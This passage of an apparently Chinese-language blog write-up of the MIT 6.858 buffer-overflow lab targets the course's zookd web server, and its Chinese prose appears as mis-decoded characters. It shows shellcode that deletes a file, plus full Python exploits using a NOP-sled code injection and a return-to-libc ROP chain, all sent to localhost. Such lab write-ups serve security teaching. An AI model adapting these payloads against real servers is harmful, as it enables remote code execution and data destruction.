rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° zookd æç¤ºäº†å­è¿›ç¨‹æ”¶åˆ°äº† <code>signal 11</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>SIGSEGV</code>ï¼‰ï¼ŒåŒæ—¶æˆ‘ä»¬æ”¶åˆ°çš„å“åº”ä¹Ÿä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸè§¦å‘äº†è¿™ä¸ªæ¼æ´</p><p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" alt="image.png"></p><blockquote><p>MIT å…¶å®è¿˜è´´å¿ƒåœ°æä¾›äº†ä¸€ä¸ª <code>exploit-template.py</code> æ–‡ä»¶ï¼Œè®©ç¬”è€…è¿™ç§ä¸æ€ä¹ˆä¼šç”¨ socket å†™è£¸ HTTP è¯·æ±‚çš„èœé¸¡å¯ä»¥å‚è€ƒï¼ˆç¬‘ï¼‰ï¼Œ<s>ä»–çœŸçš„ğŸ‘´å“­æ­»</s></p></blockquote><p>å°†æ–‡ä»¶åæ”¹æˆ <code>exploit-2.py</code> åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè¯„æµ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure><p>è¯„æµ‹çš„åŸç†æ˜¯æ£€æŸ¥ <code>/tmp/strace.log</code> å½“ä¸­æ˜¯å¦æœ‰ <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆåæ­£ç¬”è€…ç”µè„‘ä¸Šæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è·³è¿‡äº†ï¼ˆ<s>ğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</s>ï¼‰</p><blockquote><p>ä½†æ˜¯æ¯”è¾ƒ SB çš„æ˜¯è¯„æµ‹ç”¨çš„æ˜¯ MIT ç¼–è¯‘çš„ zookd è€Œä¸æ˜¯æˆ‘ä»¬è‡ªè¡Œç¼–è¯‘çš„ï¼Œç„¶åä»–å°±ä¼šç»™ğŸ‘´æŠ¥è¿™ç§SBé”™è¯¯ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" alt="image.png"></p><p>ç„¶åğŸ‘´è‡ªå·±å†é‡æ–°è¯•ç€è·‘ zookd ä¼šå‘ç°ï¼Œ<s>å› ä¸ºğŸ‘´çš„å­¦ç”ŸğŸ“æ˜¯è€æ—§çš„ Ubuntu20ï¼ŒğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</s>ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" alt="image.png"></p><p>æœ€åç¬”è€…çš„è§£å†³æ–¹æ¡ˆæ˜¯æ‹‰äº†ä¸€ä¸ª Ubuntu 22.04 çš„å®¹å™¨åœ¨é‡Œé¢åšâ€¦</p></blockquote><h2 id="Part-2-Code-injection">Part 2: Code injection</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®©æˆ‘ä»¬è¿›è¡Œä»£ç æ³¨å…¥æ¥åˆ æ‰æœåŠ¡å™¨ä¸Šçš„ <code>/home/student/grades.txt</code> æ–‡ä»¶ï¼ˆè‡ªå·±åˆ›ä¸€ä¸ªå°±è¡Œï¼‰ï¼Œè¦æ±‚æˆ‘ä»¬ä½¿ç”¨æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-exstack</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure><p>å®éªŒè¿˜ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä»½ shellcode æ¨¡æ¿ <code>shellcode.S</code>ï¼Œå½“æˆ‘ä»¬ <code>make</code> çš„æ—¶å€™å…¶ä¼šè¢«ç¼–è¯‘æˆ <code>shellcode.bin</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>run-shellcode</code> æ¥éªŒè¯å…¶åŠŸèƒ½æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ Exercise3ï¼Œä¿®æ”¹ shellcode ä½¿å…¶èƒ½åˆ é™¤  <code>/home/student/grades.txt</code>ï¼š</p><blockquote><p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p></blockquote><p>é‡Œè¾¹æ˜¯<s>ä¸‘é™‹çš„</s> AT&amp;T æ±‡ç¼–ï¼Œç¬”è€…é€‰æ‹©ç›´æ¥é‡å†™ä¸€ä»½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br> main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>pushq %rsp<br>popq  %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸåˆ é™¤æ–‡ä»¶ï¼š</p><p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" alt="image.png"></p><p>ä¹‹åå®éªŒæ–‡ä»¶æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ strace æ¥è·Ÿè¸ª zookd æ‰€ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆéœ€è¦rootï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´ç¬”è€…å…ˆèµ·ä¸€ä¸ª zookd å†è¿è¡Œ straceï¼Œä¹‹åç”¨å‰é¢çš„ exp æ‰“ä¸€ä¸‹ zookd å°±å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" alt="image.png"></p><p>å‰é¢çš„è¯„æµ‹åº”è¯¥æ˜¯åŸºäºè¿™ä¸ªå®Œæˆçš„ï¼Œä½†æ˜¯ç¬”è€…å‘ç°åœ¨ <code>/tmp/strace.log</code> å½“ä¸­ä¸ä¼šè®°å½• <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œ<s>ğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰€ä»¥è¿™é‡Œå°±å…ˆâ‘§ç®¡äº†</s></p><p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" alt="image.png"></p><p>ä»¥åŠæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ gdb è¿›è¡Œè°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" alt="image.png"></p><p>ä¹‹åå®éªŒæ‰‹å†Œæ‰¯äº†ä¸€å †æ€ä¹ˆè°ƒè¯•ï¼Œè¿™é‡Œå°±ä¸ç®¡äº†ï¼Œä¸‹é¢æ¥çœ‹ Exercise 4ï¼Œå¤§æ¦‚æ˜¯è®©æˆ‘ä»¬ç”¨ ret2shellcode æ¥æ‰“ zookd</p><blockquote><p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p><p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p><p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p><p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that addressâ€”e.g. a derivative of the provided shell code.</p></blockquote><p>å› ä¸ºæ²¡æœ‰å¼€ ASLR è€Œä¸”æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆç¬”è€…ç›´æ¥ç”¨ <code>nop</code> ä½œä¸º slide code å¹¶åœ¨æ ˆä¸Šé åçš„ä½ç½®å¸ƒç½® shellcode å³å¯ï¼Œè¿™é‡Œæ³¨æ„åˆ«å¿˜äº†æŠŠ shellcode å½“ä¸­çš„ <code>\x00</code> ç¼–ç æˆ <code>%00</code> å¦åˆ™ä¼šè¢«è¿‡æ»¤æ‰</p><blockquote><p>ç¼–å†™ shellcode æ˜¯ pwn æ‰‹æœ€åŸºç¡€çš„æŠ€èƒ½ï¼Œå¦‚æœä½ ä¸ä¼šçš„è¯â€¦  ï¼šï¼‰</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>ç¬”è€…ç¼–å†™çš„ shellcode å½“ä¸­æœ‰ <code>exit(0)</code> æ‰€ä»¥ä¸ä¼šæŠ¥ SIGSEGVï¼Œä½†æ˜¯æœ‰ä¸ªæ‰“å°å­—ç¬¦ä¸²çš„æ“ä½œè®©æˆ‘ä»¬å¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œå¦‚æœä½ æƒ³çœ‹ SIGSEGV ä¹Ÿå¯ä»¥æŠŠæœ€åçš„ exit ä»£ç å»æ‰ï¼šï¼‰</p><p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" alt="image.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæµ‹è¯„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡</p><p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" alt="image.png"></p><h2 id="Part-3-Return-to-libc-attacks">Part 3: Return-to-libc attacks</h2><p>æ¥ä¸‹æ¥ç»ˆäºåˆ°äº†<s>å¤§ä¸€å°æœ‹å‹éƒ½ä¼šçš„</s> ret2libc æ”»å‡»çš„éƒ¨åˆ†ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-nxstack</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure><p><strong>è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ï¼ˆreturn-oriented programmingï¼Œ <strong>ROP</strong>ï¼‰æ˜¯ç”¨æ¥çªç ´åŒ…æ‹¬ ASLRã€æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤åœ¨å†…çš„æœ€ä¸ºç»å…¸çš„æ”»å‡»æ‰‹æ³•ï¼Œ<s>ä½ è¦æ˜¯ä¸ä¼šğŸ‘´ä¹Ÿâ‘§æ•™ä½ ï¼Œè‡ªå·±å­¦å»</s>ï¼Œ<code>ret2libc</code> æŒ‡çš„åˆ™æ˜¯åˆ©ç”¨ libc ä¸­çš„ gadget æ¥å®Œæˆ ROP chain çš„æ„å»º</p><p>å®éªŒæ‰‹å†Œä¸­é—´çš„ä¸€å †ä»‹ç»å’Œè¯´æ˜ç›´æ¥è·³äº†ï¼Œ<s>æ²¡å•¥æ„æ€</s>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¤§è¸æ­¥è¿›å…¥ Exercise 5ï¼šç”¨ <code>ret2libc</code> è¿™ä¸€æ”»å‡»æ‰‹æ³•æ¥å®Œæˆå¯¹ zookd çš„æ”»å‡»</p><blockquote><p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p><p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p><ol><li>causes the argument to the chosen libc function to be on stack</li><li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li><li>and then causes <code>accidentally</code> to return to the chosen libc function</li></ol><p>It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p></blockquote><p>é¦–å…ˆ <code>checksec</code> ï¼Œé™¤äº† canary ä»¥å¤–çš„ä¿æŠ¤éƒ½å¼€äº†â€¦</p><p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" alt="image.png"></p><p>å¼€äº† PIE æ¯”è¾ƒéš¾å¼„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ partial overwrite çš„æ–¹å¼æ¥åœ¨ text æ®µçš„åŒä¸€å¼ é¡µé¢ä¸Šè¿›è¡Œä¸€æ¬¡è·³è½¬ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜ä¸çŸ¥é“æˆ‘ä»¬çš„å‚æ•°åˆ° <code>http_request_headers()</code> æ ˆåº•é—´çš„è·ç¦»</p><p>ä¿¡æ¯æ³„éœ²è¿™ä¸€æ­¥æ¯”è¾ƒéš¾å¼„ï¼Œäºæ˜¯ç¬”è€…çœ‹äº†çœ‹å…¶ä»–äººçš„åšæ³•ï¼Œå‘ç°<strong>å¤§å®¶éƒ½æ˜¯ç›´æ¥ç”¨ gdb çœ‹ç¨‹åºä»¥åŠ libc çš„åŸºå€â€¦</strong>ï¼ˆ~~ğŸ‘´å¯»æ€è¿™â‘ ä¸¶ä¹Ÿâ‘§å®æˆ˜å•Šï¼Œ~~ä¼°è®¡æ˜¯ä¸ºäº†æ•™å­¦ç›®çš„é™ä½äº†éš¾åº¦ï¼‰</p><blockquote><p>ç¬”è€…æƒ³äº†å¤§åŠå¤©æ€ä¹ˆæ„å»º ROPã€æ€ä¹ˆæ³„éœ² libc åœ°å€ã€é€†äº†åŠå¤©ç¨‹åºæ‰¾å¯ç”¨çš„ gadgetï¼Œæœ€åæ‰çŸ¥é“è¿™ä¸ªå®éªŒæ˜¯ç›´æ¥ç”¨ gdb æŸ¥çœ‹ç¨‹åºä»£ç æ®µ+libc çš„åœ°å€â€¦<s>æŒºæ— è¯­çš„å…¶å®</s></p></blockquote><p>é‚£ç¬”è€…åªå¥½ä¹Ÿè¿™ä¹ˆåšäº†ï¼ˆç¬‘ï¼‰ï¼Œè™½ç„¶è¯´ä»–æä¾›äº†ä¸€ä¸ªè«åå…¶å¦™çš„ <code>accidentially()</code> å‡½æ•°ä½†æ˜¯ç¬”è€…é€‰æ‹©ç›´æ¥å¿½ç•¥ï¼Œéšä¾¿æ‰¾ç¨‹åºä¸­çš„ä¸€ä¸ª <code>ret</code> æ„é€ æ»‘æ¿åé¢è·Ÿ ROP é“¾å³å¯ï¼Œå› ä¸ºè¿™ä¸ª Exercise è¯´å®è¯åšèµ·æ¥è«åå…¶å¦™çš„æ‰€ä»¥ç¬”è€…ä¹Ÿç”¨è«åå…¶å¦™çš„è§£æ³•å¥½äº†ï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œé…åˆ ROPgadget æ‰¾äº†ä¸€äº› gadget éšä¾¿å‡‘äº†ä¸€ä¸ªå¯ç”¨çš„ ROP chainï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>ç¬”è€…çš„è§£æ³•ç®€å•æ¥è¯´æ˜¯ç”¨ malloc æ¥åˆ†é…ä¸€ä¸ª chunk å¾€ä¸Šé¢å†™å­—ç¬¦ä¸²ï¼Œä¹‹å <code>unlink(chunk)</code> 